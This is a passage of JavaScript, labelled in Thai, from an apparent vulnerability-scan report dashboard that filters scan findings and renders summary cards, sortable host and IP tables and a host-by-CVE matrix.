          if(f.bucket !== 'safe') return false;
        } else {
          if(f.bucket !== 'vulnerable' && f.bucket !== 'warning') return false;
          const sc = parseFloat(f.cvss != null ? f.cvss : f.base_cvss || 0);
          const bin = Math.min(9, Math.max(1, Math.floor(sc)));
          if(bin !== F.cvssBin) return false;
        }
      }
      return true;
    });

    // If finding-based filter is active, exclude hosts with 0 matching findings!
    if(isFindingFilter && matchedFinds.length === 0){
      return;
    }

    // 5. Query search
    if(qLow){
      const ftxt = matchedFinds.map(f => (f.cve||'') + ' ' + (f.cat||'') + ' ' + (f.name||'') + ' ' + (f.reason||'') + ' ' + (f.sev||'')).join(' ');
      const hstr = (h.host + ' ' + (h.ip||'') + ' ' + (h.server||'') + ' ' + (h.php||'') + ' ' + (h.cms||'') + ' ' + ftxt).toLowerCase();
      if(!hstr.includes(qLow)) return;
    }

    // Virtual Host: counts and findings strictly reflect matched findings
    const vh = {
      ...h,
      findings: matchedFinds,
      allFindings: allFinds,
      vulnerable: matchedFinds.filter(f => f.bucket === 'vulnerable').length,
      warning: matchedFinds.filter(f => f.bucket === 'warning').length,
      unknown: matchedFinds.filter(f => f.bucket === 'unknown').length,
      safe: matchedFinds.filter(f => f.bucket === 'safe').length
    };

    if(matchedFinds.length > 0){
      const impactScores = matchedFinds
        .filter(f => f.bucket === 'vulnerable' || f.bucket === 'warning')
        .map(f => parseFloat(f.cvss != null ? f.cvss : f.base_cvss || 0));
      if(impactScores.length > 0){
        vh.maxcvss = Math.max(...impactScores);
      } else if(vh.safe > 0 && vh.unknown === 0){
        vh.maxcvss = 0.0;
      } else {
        vh.maxcvss = 0.0;
      }
      if(vh.vulnerable > 0) vh.level = 'critical';
      else if(vh.warning > 0) vh.level = 'warning';
      else if(vh.unknown > 0) vh.level = 'unknown';
      else vh.level = 'safe';
    } else {
      vh.maxcvss = h.maxcvss || 0;
      vh.level = h.level;
    }

    matchedFinds.forEach(f => filteredFindings.push({ ...f, host: h.host, ip: h.ip }));
    filteredHosts.push(vh);
  });

  const isFiltered = (F.bucket !== 'all' || F.level !== 'all' || F.sev !== 'all' || F.cat !== 'all' ||
                      F.server !== 'all' || !!F.ip || F.ipType !== 'all' || F.cve !== 'all' ||
                      F.cvssBin >= 0 || !!qLow);

  return { filteredHosts, filteredFindings, isFiltered };
}

// Master Update: updates banner, cards, ov, sev, tables, matrix, and charts
function updateAll(scrollTarget){
  const data = getFilteredData();
  cachedFilteredData = data;

  updateBanner(data);
  updateCards(data);
  updateOverviewAndSev(data);
  renderHostTable(data);
  renderIPTable(data);
  renderMatrixTable(data);
  updateCharts(data);

  if(scrollTarget){
    scrollToTable(scrollTarget);
  }
}

// ── 1. Sticky Filter Banner ──
function updateBanner(data){
  const b = document.getElementById('filter-banner');
  if(!b) return;
  if(!data.isFiltered){
    b.style.display = 'none';
    return;
  }
  b.style.display = 'flex';

  const chips = [];
  const bktNames = { vulnerable: 'ยืนยันแล้ว (เสี่ยง)', warning: 'อาจเสี่ยง (Warning)', unknown: 'ยังไม่ทราบ (Unknown)', safe: 'ปลอดภัย (Safe)' };
  const lvlNames = { critical: 'เสี่ยงสูง (Critical)', warning: 'อาจเสี่ยง (Warning)', unknown: 'ยังไม่ทราบ (Unknown)', safe: 'ปลอดภัย (Safe)', 'n/a': 'เข้าไม่ถึง (Unreachable)' };

  if(F.bucket !== 'all'){
    chips.push(`<span class="flt-chip">สถานะ: <b>${bktNames[F.bucket]||F.bucket}</b><span class="del" onclick="filterByBucket('all')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.level !== 'all'){
    chips.push(`<span class="flt-chip">ระดับโฮสต์: <b>${lvlNames[F.level]||F.level}</b><span class="del" onclick="filterByLevel('all')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.cat !== 'all'){
    chips.push(`<span class="flt-chip">หมวด: <b>${esc(F.cat)}</b><span class="del" onclick="filterByCategory('all')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.sev !== 'all'){
    chips.push(`<span class="flt-chip">ความรุนแรง: <b>${esc(F.sev)}</b><span class="del" onclick="filterBySeverity('all')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.server !== 'all'){
    chips.push(`<span class="flt-chip">เซิร์ฟเวอร์: <b>${esc(F.server)}</b><span class="del" onclick="filterByServer('all')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.ip){
    chips.push(`<span class="flt-chip">IP: <b>${esc(F.ip)}</b><span class="del" onclick="filterByIP('')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.ipType !== 'all'){
    chips.push(`<span class="flt-chip">ประเภท IP: <b>${F.ipType==='public'?'Public':'Private'}</b><span class="del" onclick="filterIPType('all')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.cve !== 'all'){
    chips.push(`<span class="flt-chip">CVE: <b>${esc(F.cve)}</b><span class="del" onclick="filterByCVE('all')" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.cvssBin >= 0){
    const cvssChipTxt = (F.cvssBin === 0) ? '0.0 (ปลอดภัย / None)' : (F.cvssBin === 9 ? '9.0–10.0 (Critical)' : `${F.cvssBin}.0–${F.cvssBin}.9`);
    chips.push(`<span class="flt-chip">CVSS: <b>${cvssChipTxt}</b><span class="del" onclick="filterByCvssBin(-1)" title="ลบตัวกรองนี้">✕</span></span>`);
  }
  if(F.q){
    chips.push(`<span class="flt-chip">ค้นหา: <b>"${esc(F.q)}"</b><span class="del" onclick="applySearch('')" title="ลบตัวกรองนี้">✕</span></span>`);
  }

  document.getElementById('filter-banner-text').innerHTML = chips.join('');
  const uniqueIPs = new Set(data.filteredHosts.map(h => h.ip).filter(Boolean)).size;
  const detCnt = (F.bucket === 'all')
    ? data.filteredFindings.filter(f => f.bucket === 'vulnerable' || f.bucket === 'warning').length
    : data.filteredFindings.length;
  document.getElementById('filter-banner-stats').textContent = `(พบ ${data.filteredHosts.length} โฮสต์ · ${uniqueIPs} IP · ตรวจพบ ${detCnt} รายการ)`;
}

// ── 2. KPI Cards ──
function updateCards(data){
  const el = document.getElementById('cards');
  if(!el) return;
  const hh = data.filteredHosts;
  const ff = data.filteredFindings;
  const maxScore = hh.length ? Math.max(...hh.map(h => h.score||0)) : 0;
  const vulnCnt = ff.filter(f => f.bucket==='vulnerable').length;
  const warnCnt = ff.filter(f => f.bucket==='warning').length;
  const unkCnt = ff.filter(f => f.bucket==='unknown').length;
  const safeCnt = ff.filter(f => f.bucket==='safe').length;

  const cards = [
    ['ดัชนีเสี่ยงสูงสุด', maxScore, "sortBy('score')", 'คลิกเพื่อเรียงตามดัชนีเสี่ยง'],
    ['ยืนยันเสี่ยง', `${vulnCnt}`, "filterByBucket('vulnerable')", 'คลิกเพื่อแสดงเฉพาะรายการยืนยันเสี่ยง'],
    ['อาจเสี่ยง', `${warnCnt}`, "filterByBucket('warning')", 'คลิกเพื่อแสดงเฉพาะรายการอาจเสี่ยง'],
    ['ยังไม่ทราบ', `${unkCnt}`, "filterByBucket('unknown')", 'คลิกเพื่อแสดงเฉพาะรายการยังไม่ทราบ'],
    ['ปลอดภัย', `${safeCnt}`, "filterByBucket('safe')", 'คลิกเพื่อแสดงเฉพาะรายการปลอดภัย']
  ];

  el.innerHTML = cards.map(c => `
    <div class="card" onclick="${c[2]}" title="${c[3]}">
      <div class="n" style="${c[0]==='ยืนยันเสี่ยง'&&vulnCnt>0?'color:var(--vuln)':c[0]==='อาจเสี่ยง'&&warnCnt>0?'color:var(--warn)':''}">${c[1]}</div>
      <div class="l">${c[0]} 🔍</div>
    </div>
  `).join('');
}

// ── 3. Overview & Severity Panels ──
function updateOverviewAndSev(data){
  const ff = data.filteredFindings;
  const hh = data.filteredHosts;
  
  // Overview: findings breakdown
  const v = ff.filter(f => f.bucket==='vulnerable').length;
  const w = ff.filter(f => f.bucket==='warning').length;
  const u = ff.filter(f => f.bucket==='unknown').length;
  const s = ff.filter(f => f.bucket==='safe').length;
  const unreach = hh.filter(h => !h.reachable).length;
  const m = Math.max(v, w, u, s, unreach, 1);

  function ovBar(lab, val, max, col, bkt){
    const p = Math.round((val/max)*100);
    return `<div class="bar" onclick="filterByBucket('${bkt}')" style="cursor:pointer" title="คลิกเพื่อแสดงเฉพาะ: ${lab}">
      <span class="lab">${lab} 🔍</span>
      <span class="track"><span class="fill" style="width:${p}%;background:${col}"></span></span>
      <span class="v" style="color:${col}">${val}</span>
    </div>`;
  }

  // หมายเหตุ: การ์ดนี้นับ "รายหัวข้อ CVE" เท่านั้น — "เข้าไม่ถึง" เป็นหน่วยโฮสต์ จึงย้ายไปการ์ดภาพรวมโฮสต์
  const mm = Math.max(v, w, u, s, 1);
  let ovHtml = ovBar('ยืนยันเสี่ยง', v, mm, LC.critical, 'vulnerable')
             + ovBar('อาจเสี่ยง', w, mm, LC.warning, 'warning')
             + ovBar('ยังไม่ทราบ', u, mm, LC.unknown, 'unknown')
             + ovBar('ปลอดภัย', s, mm, LC.safe, 'safe');
  const ovEl = document.getElementById('ov');
  if(ovEl) ovEl.innerHTML = ovHtml;

  // Host-level overview (นับรายเครื่อง) — ตัวเลขตรงกับการกระจายโฮสต์ในไฟล์ PDF/Excel
  const hv = hh.filter(h => h.reachable && h.level==='critical').length;
  const hw = hh.filter(h => h.reachable && h.level==='warning').length;
  const hu = hh.filter(h => h.reachable && h.level==='unknown').length;
  const hs = hh.filter(h => h.reachable && h.level==='safe').length;
  const hur = hh.filter(h => !h.reachable).length;
  const hm = Math.max(hv, hw, hu, hs, hur, 1);
  function ovhBar(lab, val, col, act){
    const p = Math.round((val/hm)*100);
    return `<div class="bar" onclick="${act}" style="cursor:pointer" title="คลิกเพื่อกรองโฮสต์: ${lab}">
      <span class="lab">${lab} 🔍</span>
      <span class="track"><span class="fill" style="width:${p}%;background:${col}"></span></span>
      <span class="v" style="color:${col}">${val}</span>
    </div>`;
  }
  const ovhEl = document.getElementById('ovh');
  if(ovhEl){
    ovhEl.innerHTML =
        ovhBar('เสี่ยงสูง', hv, LC.critical, "filterByLevel('critical')")
      + ovhBar('อาจเสี่ยง', hw, LC.warning, "filterByLevel('warning')")
      + ovhBar('ยังไม่ทราบ', hu, LC.unknown, "filterByLevel('unknown')")
      + ovhBar('ปลอดภัย', hs, LC.safe, "filterByLevel('safe')")
      + ovhBar('เข้าไม่ถึง', hur, LC['n/a'], "filterByUnreachable()");
  }

  // Severity breakdown (นับเฉพาะรายการที่ตรวจพบจริง ยกเว้นผู้ใช้กดกรองสถานะอื่นโดยตรง)
  const sevCounts = { Critical: 0, High: 0, Medium: 0, Low: 0, Info: 0 };
  const sevFinds = (F.bucket === 'all')
    ? ff.filter(f => f.bucket === 'vulnerable' || f.bucket === 'warning')
    : ff;
  sevFinds.forEach(f => {
    const sv = f.sev || 'Info';
    if(sevCounts[sv] !== undefined) sevCounts[sv]++;
    else sevCounts.Info++;
  });
  const sm = Math.max(...Object.values(sevCounts), 1);
  const sevEl = document.getElementById('sev');
  if(sevEl){
    sevEl.innerHTML = Object.keys(sevCounts).map(k => {
      const val = sevCounts[k];
      const p = Math.round((val/sm)*100);
      const col = SC[k] || '#868e96';
      return `<div class="bar" onclick="filterBySeverity('${k}')" style="cursor:pointer" title="คลิกเพื่อค้นหา: ${k}">
        <span class="lab">${k} 🔍</span>
        <span class="track"><span class="fill" style="width:${p}%;background:${col}"></span></span>
        <span class="v" style="color:${col}">${val}</span>
      </div>`;
    }).join('');
  }
}

// ── 4. Host Table ──
function sortBy(k){
  if(sortKey===k) sortDir*=-1;
  else { sortKey=k; sortDir=(k==='host'?1:-1); }
  renderHostTable(cachedFilteredData || getFilteredData());
}

function renderHostTable(data){
  const rows = [...data.filteredHosts];
  const RO = { critical:0, warning:1, unknown:2, safe:3, 'n/a':4 };

  if(sortKey){
    rows.sort((a,b) => {
      let x=a[sortKey], y=b[sortKey];
      if(typeof x==='string') return x.localeCompare(y)*sortDir;
      return ((x>y?1:x<y?-1:0))*sortDir;
    });
  } else {
    rows.sort((a,b) => (RO[a.level]-RO[b.level])||(b.maxcvss-a.maxcvss)||(b.score-a.score));
  }

  // Determine dynamic columns based on active filter
  let cols = [['num','#'], ['host','โฮสต์'], ['ip','IP Address'], ['server','เซิร์ฟเวอร์'], ['php','PHP']];
  
  if(F.bucket === 'vulnerable'){
    cols.push(['vulnerable','ยืนยัน (เสี่ยง)']);
  } else if(F.bucket === 'warning'){
    cols.push(['warning','อาจเสี่ยง']);
  } else if(F.bucket === 'unknown'){
    cols.push(['unknown','ยังไม่ทราบ']);
  } else if(F.bucket === 'safe'){
    cols.push(['safe','ปลอดภัย']);
  } else if(F.cat !== 'all' || F.sev !== 'all' || F.cve !== 'all'){
    cols.push(['findings_cnt', `รายการตรง (${F.cat!=='all'?F.cat:F.sev!=='all'?F.sev:F.cve})`]);
  } else {
    cols.push(['lfi','LFI'], ['vulnerable','เสี่ยง'], ['warning','อาจเสี่ยง'], ['unknown','ไม่ทราบ']);
  }

  cols.push(['maxcvss','CVSS สูงสุด'], ['score','ดัชนีเสี่ยง'], ['level','ระดับ']);

  const thd = document.getElementById('thd');
  if(thd){
    thd.innerHTML = '<tr>' + cols.map(c => `
      <th onclick="${c[0]==='num'?'':`sortBy('${c[0]}')`}" style="${c[0]==='num'?'width:44px;text-align:center;cursor:default':''}">
        ${c[1]}${sortKey===c[0]?(sortDir>0?' ▲':' ▼'):''}
      </th>
    `).join('') + '</tr>';
  }

  const tb = document.getElementById('tb');
  if(!tb) return;

  if(!rows.length){
    tb.innerHTML = `<tr><td colspan="${cols.length}" style="text-align:center;color:var(--muted);padding:30px">
      ไม่พบโฮสต์ที่ตรงกับเงื่อนไขตัวกรองในปัจจุบัน</td></tr>`;
    document.getElementById('cnt').innerHTML = `แสดง <b>0</b> / ${D.hosts.length} โฮสต์`;
    return;
  }

  tb.innerHTML = rows.map((h, i) => {
    const cls = h.reachable ? h.level : 'n/a';
    const rowCls = cls==='critical'?'critical-row':cls==='warning'?'warning-row':cls==='safe'?'safe-row':'unknown-row';
    const reach = h.reachable ? '' : `<span class="pill" style="background:#9aa0ab;margin-left:6px;font-size:10px">เข้าไม่ถึง</span>`;
    const ipCell = h.ip ? `<code style="font-size:11px;background:#f0f3fb;padding:1px 5px;border-radius:3px;color:#1d4ed8">${esc(h.ip)}</code>` : '<span style="color:#ccc">—</span>';
    
    // Matched badges for quick glance
    let matchBadges = '';
    if(F.cat !== 'all' || F.cve !== 'all'){
      const cves = [...new Set(h.findings.map(f => f.cve).filter(Boolean))];
      if(cves.length){
        matchBadges = `<div style="margin-top:3px;display:flex;gap:3px;flex-wrap:wrap">` +
          cves.slice(0, 3).map(c => `<span class="tag" style="background:#eef2fb;color:var(--ink);border:1px solid #c5d2f6;font-size:10px">${esc(c)}</span>`).join('') +
          (cves.length > 3 ? `<span style="font-size:10px;color:var(--muted)">+${cves.length-3}</span>` : '') +
          `</div>`;
      }
    }

    let dynamicCells = '';
    if(F.bucket === 'vulnerable'){
      dynamicCells = `<td style="text-align:center;font-weight:800;color:var(--vuln);font-size:14px">${h.vulnerable||'—'}</td>`;
    } else if(F.bucket === 'warning'){
      dynamicCells = `<td style="text-align:center;font-weight:800;color:var(--warn);font-size:14px">${h.warning||'—'}</td>`;
    } else if(F.bucket === 'unknown'){
      dynamicCells = `<td style="text-align:center;font-weight:700;color:var(--unk)">${h.unknown||'—'}</td>`;
    } else if(F.bucket === 'safe'){
      dynamicCells = `<td style="text-align:center;font-weight:700;color:var(--safe)">${h.safe||'—'}</td>`;
    } else if(F.cat !== 'all' || F.sev !== 'all' || F.cve !== 'all'){
      dynamicCells = `<td style="text-align:center;font-weight:800;color:var(--ink);font-size:14px">${h.findings.length||'—'}</td>`;
    } else {
      dynamicCells = `
        <td style="text-align:center">${h.lfi||'—'}</td>
        <td style="text-align:center;font-weight:700;color:${h.vulnerable?'var(--vuln)':'inherit'}">${h.vulnerable||'—'}</td>
        <td style="text-align:center;font-weight:700;color:${h.warning?'var(--warn)':'inherit'}">${h.warning||'—'}</td>
        <td style="text-align:center">${h.unknown||'—'}</td>
      `;
    }

    return `<tr class="${rowCls}" onclick="openDr('${esc(h.host).replace(/'/g,"\'")}')">
      <td style="text-align:center;font-weight:700;color:var(--muted);font-size:12px;width:44px">${i+1}</td>
      <td style="min-width:200px">
        <b style="color:var(--ink);cursor:pointer">${esc(h.host)}</b>${reach}
        ${matchBadges}
      </td>
      <td>${ipCell}</td>
      <td>${esc(h.server)||'—'}</td>
      <td>${esc(h.php)||'—'}</td>
      ${dynamicCells}
      <td style="text-align:center;font-weight:700;color:${hostCvssColor(h)}">${fmtHostCvss(h)}</td>
      <td style="text-align:center;font-weight:800;font-size:15px">${h.score}</td>
      <td><span class="pill" style="background:${LC[cls]}">${LT[cls]}</span></td>
    </tr>`;
  }).join('');

  const detectedTotal = data.filteredFindings.filter(f => f.bucket === 'vulnerable' || f.bucket === 'warning').length;
  const countLabel = (F.bucket === 'all')
    ? `ตรวจพบช่องโหว่จริง <b>${detectedTotal}</b> รายการ (จากที่สแกน ${data.filteredFindings.length} รายการ)`
    : `ตรงตามตัวกรอง <b>${data.filteredFindings.length}</b> รายการ`;
  document.getElementById('cnt').innerHTML =
    `แสดง <b>${rows.length}</b> / ${D.hosts.length} โฮสต์ (ลำดับ 1-${rows.length}) · ${countLabel} · <span style="color:var(--muted);font-size:12px">💡 คลิกแถวเพื่อดูรายละเอียดช่องโหว่</span>`;
}

// ── 5. IP Report ──
function buildIPMapFromHosts(hosts){
  const m = {};
  hosts.forEach(h => {
    const ip = h.ip || '';
    if(!ip) return;
    if(!m[ip]) m[ip] = { ip, hosts: [], pub: isPublicIP(ip) };
    m[ip].hosts.push(h);
  });
  return Object.values(m);
}

function worstLevel(hosts){
  const RO = { critical:0, warning:1, unknown:2, safe:3, 'n/a':4 };
  let best = 'n/a';
  hosts.forEach(h => {
    const l = h.reachable ? h.level : 'n/a';
    if((RO[l]??9) < (RO[best]??9)) best = l;
  });
  return best;
}

function sortByIP(k){
  if(sortKeyIP===k) sortDirIP*=-1;
  else { sortKeyIP=k; sortDirIP=(k==='ip'?1:-1); }
  renderIPTable(cachedFilteredData || getFilteredData());
}

function renderIPTable(data){
  const ipData = buildIPMapFromHosts(data.filteredHosts);
  const totalIP = ipData.length;
  const pubIP = ipData.filter(d => d.pub === true).length;
  const privIP = ipData.filter(d => d.pub === false).length;
  const noIP = data.filteredHosts.filter(h => !h.ip).length;

  // Summary cards
  const sumEl = document.getElementById('ip-sum');
  if(sumEl){
    sumEl.innerHTML =
      `<div class="ip-sum-card" onclick="filterIPType('all')" style="cursor:pointer" title="คลิกเพื่อดู IP ทั้งหมด"><div class="n">${totalIP}</div><div class="l">IP ทั้งหมด 🔍</div></div>` +
      `<div class="ip-sum-card" onclick="filterIPType('public')" style="cursor:pointer" title="คลิกเพื่อดู IP สาธารณะ"><div class="n">${pubIP}</div><div class="l">IP สาธารณะ 🔍</div></div>` +
      `<div class="ip-sum-card" onclick="filterIPType('private')" style="cursor:pointer" title="คลิกเพื่อดู IP ภายใน"><div class="n">${privIP}</div><div class="l">IP ภายใน 🔍</div></div>` +
      `<div class="ip-sum-card" onclick="filterIPType('none')" style="cursor:pointer" title="คลิกเพื่อดูโฮสต์ที่ยังไม่ระบุ IP"><div class="n">${noIP}</div><div class="l">ยังไม่ระบุ IP 🔍</div></div>`;
  }

  let list = [...ipData];
  const RO = { critical:0, warning:1, unknown:2, safe:3, 'n/a':4 };

  list.sort((a,b) => {
    const wa = worstLevel(a.hosts), wb = worstLevel(b.hosts);
    if(sortKeyIP==='ip') return a.ip.localeCompare(b.ip)*sortDirIP;
    if(sortKeyIP==='hosts') return (b.hosts.length - a.hosts.length)*sortDirIP;
    if(sortKeyIP==='cvss'){
      const ca = Math.max(...a.hosts.map(h => h.maxcvss||0), 0);
      const cb = Math.max(...b.hosts.map(h => h.maxcvss||0), 0);
      return (cb - ca)*sortDirIP;
    }
    if(sortKeyIP==='vuln'){
      const va = a.hosts.reduce((s,h) => s + (h.vulnerable||0), 0);
      const vb = b.hosts.reduce((s,h) => s + (h.vulnerable||0), 0);
      return (vb - va)*sortDirIP;
    }
    return ((RO[wa]??9)-(RO[wb]??9)) || (b.hosts.length - a.hosts.length);
  });

  const ipCols = [['num','#'], ['ip','IP Address'], ['hosts','โฮสต์ (จำนวน)'], ['vuln', F.bucket==='vulnerable'?'ยืนยันเสี่ยง':F.bucket==='warning'?'อาจเสี่ยง':'รายการที่พบ'], ['cvss','CVSS สูงสุด'], ['worst','ระดับ']];
  const thd = document.getElementById('ipthd');
  if(thd){
    thd.innerHTML = '<tr>' +
      ipCols.map(c => `<th onclick="${c[0]==='num'?'':`sortByIP('${c[0]}')`}" style="${c[0]==='num'?'width:44px;text-align:center;cursor:default':'cursor:pointer'}">${c[1]}${sortKeyIP===c[0]?(sortDirIP>0?' ▲':' ▼'):''}</th>`).join('') +
      '<th>ประเภท</th></tr>';
  }

  const tb = document.getElementById('iptb');
  if(!tb) return;
  if(!list.length){
    tb.innerHTML = `<tr><td colspan="7" style="text-align:center;color:var(--muted);padding:24px">
      ไม่พบข้อมูล IP ที่ตรงกับเงื่อนไขการกรอง</td></tr>`;
    const ipCnt = document.getElementById('ipcnt');
    if(ipCnt) ipCnt.innerHTML = `แสดง <b>0</b> IP`;
    return;
  }

  tb.innerHTML = list.map((d, i) => {
    const worst = worstLevel(d.hosts);
    const cls = worst;
    const rowCls = cls==='critical'?'critical-row':cls==='warning'?'warning-row':cls==='safe'?'safe-row':'unknown-row';
    const uid = `ip_${d.ip.replace(/\./g,'_')}`;
    const totalFinds = d.hosts.reduce((s,h) => s + (
      F.bucket==='vulnerable' ? (h.vulnerable||0) :
      F.bucket==='warning' ? (h.warning||0) :
      F.bucket==='unknown' ? (h.unknown||0) :
      F.bucket==='safe' ? (h.safe||0) :
      ((h.vulnerable||0) + (h.warning||0))
    ), 0);
    const maxCVSS = Math.max(...d.hosts.map(h => h.maxcvss||0), 0);
    const typLab = d.pub===true ? '<span class="ip-type pub">Public</span>' : d.pub===false ? '<span class="ip-type priv">Private</span>' : '<span class="ip-type" style="background:#f3f4f6;color:#6b7280">?</span>';
    const hostsSummary = d.hosts.slice(0,3).map(h => esc(h.host)).join(', ') + (d.hosts.length>3 ? ` +${d.hosts.length-3} อื่น` : '');

    const hostSubRows = d.hosts.map((h, hi) => {
      const hcls = h.reachable ? h.level : 'n/a';
      const fcount = (
        F.bucket==='vulnerable' ? (h.vulnerable||0) :
        F.bucket==='warning' ? (h.warning||0) :
        F.bucket==='unknown' ? (h.unknown||0) :
        F.bucket==='safe' ? (h.safe||0) :
        ((h.vulnerable||0) + (h.warning||0))
      );
      return `<tr class="${hcls==='critical'?'critical-row':hcls==='warning'?'warning-row':hcls==='safe'?'safe-row':'unknown-row'}"
                  onclick="openDr('${esc(h.host).replace(/'/g,"\'")}');event.stopPropagation()"
                  style="font-size:12px;cursor:pointer">
        <td style="width:44px;text-align:center;color:var(--muted);font-weight:700;font-size:11px">${hi+1}</td>
        <td style="padding-left:14px;color:var(--ink);font-weight:600">↳ ${esc(h.host)}</td>
        <td style="text-align:center;font-size:11px;color:var(--muted)">${esc(h.server)||'—'}</td>
        <td style="text-align:center;font-weight:700;color:${fcount?'var(--vuln)':'inherit'}">${fcount||'—'}</td>
        <td style="text-align:center;font-weight:700;color:${hostCvssColor(h)}">${fmtHostCvss(h)}</td>
        <td><span class="pill" style="background:${LC[hcls]||'#9aa0ab'};font-size:10px">${LT[hcls]||hcls}</span></td>
        <td></td>
      </tr>`;
    }).join('');

    const ipCvssDisp = (maxCVSS > 0) ? maxCVSS.toFixed(1) : (worst === 'safe' || F.cvssBin === 0 || F.bucket === 'safe' ? '0.0' : '—');
    const ipCvssCol = (ipCvssDisp === '—') ? '#6b7280' : cvssColor(parseFloat(ipCvssDisp));

    return `<tr class="${rowCls}" id="iptr_${uid}" onclick="togIPRow('${uid}')" style="cursor:pointer">
      <td style="text-align:center;font-weight:700;color:var(--muted);font-size:12px;width:44px">${i+1}</td>
      <td><code style="font-size:12px;background:#f0f3fb;padding:2px 6px;border-radius:3px;color:#1d4ed8">${esc(d.ip)}</code>
        <span style="color:var(--muted);font-size:11px;margin-left:6px">${hostsSummary}</span></td>
      <td style="text-align:center;font-weight:700">${d.hosts.length}
        <span style="color:var(--muted);font-size:10px" id="iarr_${uid}"> ›</span></td>
      <td style="text-align:center;font-weight:700;color:${totalFinds?'var(--vuln)':'inherit'}">${totalFinds||'—'}</td>
      <td style="text-align:center;font-weight:700;color:${ipCvssCol}">${ipCvssDisp}</td>
      <td><span class="pill" style="background:${LC[worst]||'#9aa0ab'}">${LT[worst]||worst}</span></td>
      <td>${typLab}</td>
    </tr>
    <tr id="ipsub_${uid}" style="display:none"><td colspan="7" style="padding:0;border-bottom:2px solid var(--line);background:#fbfcfe">
      <div style="padding:6px 14px;background:#f0f3fb;font-size:11px;font-weight:700;color:var(--ink)">📋 รายชื่อ ${d.hosts.length} โฮสต์ที่ให้บริการบน IP ${esc(d.ip)} (เรียงลำดับ 1 ถึง ${d.hosts.length}):</div>
      <table style="width:100%;border-collapse:collapse;font-size:12px">${hostSubRows}</table>
    </td></tr>`;
  }).join('');

  const ipCnt = document.getElementById('ipcnt');
  if(ipCnt){
    ipCnt.innerHTML = `แสดง <b>${list.length}</b> IP (ลำดับ 1-${list.length}) · <span style="color:var(--muted);font-size:12px">💡 คลิกแถว IP เพื่อขยายดูรายชื่อโฮสต์ใน IP นั้น</span>`;
  }
}

function togIPRow(uid){
  const sub = document.getElementById('ipsub_' + uid);
  const arr = document.getElementById('iarr_' + uid);
  if(!sub) return;
  const open = sub.style.display === 'none';
  sub.style.display = open ? '' : 'none';
  if(arr) arr.textContent = open ? ' ▾' : ' ›';
}

// ── 6. Dynamic Matrix (โฮสต์ × CVE) ──
var MX_PFX = {'NGINX':'N','PHP':'P','Node.js':'J','GitLab':'G','App':'A','Device':'D',
              'Component':'C','Exposure':'E','Framework':'F','Headers':'H','TLS':'T','Online CVE':'O','OS/Kernel':'K','Container':'R'};
var MX_ORD = {'NGINX':0,'PHP':1,'Node.js':2,'GitLab':3,'App':4,'Device':5,'Component':6,
              'Exposure':7,'Framework':8,'Headers':9,'TLS':10,'Online CVE':11,'OS/Kernel':12,'Container':13};
function getAllCVEList(){
  const map = {};
  D.findings.forEach(f => {
    if(!f.cve || map[f.cve]) return;
    map[f.cve] = {cve: f.cve, cat: f.cat || 'Other', sev: f.sev || 'Info',
                  name: f.name || f.cve,
                  cvss: (f.base_cvss != null ? f.base_cvss : (f.cvss || 0))};
  });
  // เรียงให้คอลัมน์หมวดเดียวกันอยู่ติดกัน (ตามลำดับหมวด แล้วตาม CVE id)
  const arr = Object.values(map).sort((a, b) => {
    const oa = (MX_ORD[a.cat] != null ? MX_ORD[a.cat] : 99);
    const ob = (MX_ORD[b.cat] != null ? MX_ORD[b.cat] : 99);
    if(oa !== ob) return oa - ob;
    return a.cve < b.cve ? -1 : (a.cve > b.cve ? 1 : 0);
  });
  // ให้รหัสต่อเนื่องต่อ prefix (N1,N2,... / P1,P2,...) — prefix ไม่ชนกันแล้ว
  const seen = {};
  arr.forEach(c => {
    const pfx = MX_PFX[c.cat] || (c.cat[0] || 'X').toUpperCase();
    seen[pfx] = (seen[pfx] || 0) + 1;
    c.code = pfx + seen[pfx];
  });
  return arr;
}

function renderMatrixTable(data){
  const allCVEs = getAllCVEList();
  const hosts = data.filteredHosts;

  // Filter CVE columns: if specific CVE or Category filter is active, or show CVEs present in current findings
  let activeCVEs = allCVEs;
  if(F.cve !== 'all'){
    activeCVEs = allCVEs.filter(c => c.cve.toUpperCase() === F.cve.toUpperCase());
  } else if(F.cat !== 'all'){
    activeCVEs = allCVEs.filter(c => c.cat.toLowerCase() === F.cat.toLowerCase());
  } else if(data.isFiltered){
    const presentCVEs = new Set(data.filteredFindings.map(f => f.cve).filter(Boolean));
    if(presentCVEs.size > 0){
      activeCVEs = allCVEs.filter(c => presentCVEs.has(c.cve));
    }
  }

  // 1. Matrix Header
  const thd = document.getElementById('mxthd');
  if(thd){
    thd.innerHTML = `<tr>
      <th style="width:40px;text-align:center">#</th>
      <th style="text-align:left;min-width:180px">โฮสต์ (${hosts.length})</th>
      <th style="text-align:left;min-width:90px">IP</th>
      ${activeCVEs.map(c => `<th style="width:34px;text-align:center;cursor:pointer" onclick="filterByCVE('${c.cve}')" title="${esc(c.code)}: ${esc(c.cve)} (${esc(c.name)}) [${esc(c.sev)}] - คลิกเพื่อกรอง">${esc(c.code)}</th>`).join('')}
    </tr>`;
  }

  // 2. Matrix Body
  const tb = document.getElementById('mxtb');
  if(!tb) return;

  if(!hosts.length){
    tb.innerHTML = `<tr><td colspan="${activeCVEs.length + 3}" style="text-align:center;color:var(--muted);padding:24px">
      ไม่พบข้อมูลโฮสต์ที่ตรงกับตัวกรองสำหรับแสดงผลในเมทริกซ์</td></tr>`;
    const mxCnt = document.getElementById('mx-cnt');
    if(mxCnt) mxCnt.innerHTML = `แสดง <b>0</b> โฮสต์ในเมทริกซ์`;
    return;
  }

  tb.innerHTML = hosts.map((h, i) => {
    // Map findings of this host by CVE
    const fMap = {};
    h.findings.forEach(f => {
      if(f.cve) fMap[f.cve] = f;
    });

    const cells = activeCVEs.map(c => {
      const f = fMap[c.cve];
      if(!f){
        return `<td class="mxc mx-na">—</td>`;
      }
      if(f.bucket === 'vulnerable'){
        return `<td class="mxc mx-v" title="${esc(h.host)}: ${esc(c.cve)} - ยืนยันแล้ว (เสี่ยง)" onclick="openDr('${esc(h.host).replace(/'/g,"\'")}');event.stopPropagation()">✕</td>`;
      }
